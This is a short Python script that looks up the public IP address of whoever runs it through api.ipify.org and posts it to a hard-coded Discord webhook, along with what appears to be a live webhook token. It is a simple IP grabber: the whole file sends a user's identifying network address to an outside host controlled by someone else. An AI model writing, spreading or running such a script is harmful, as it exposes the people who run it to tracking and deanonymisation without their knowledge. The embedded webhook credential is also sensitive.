import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error getting IP: {e}")
        return None

def send_ip_to_discord(ip):
    data = {
        "content": f"User's public IP address: {ip}"
    }
    try:
        result = requests.post(WEBHOOK_URL, json=data)
        result.raise_for_status()
        print("IP sent to Discord successfully.")
    except requests.RequestException as e:
        print(f"Error sending IP to Discord: {e}")

def main():
    ip = get_public_ip()
    if ip:
        send_ip_to_discord(ip)

if __name__ == "__main__":
    main()
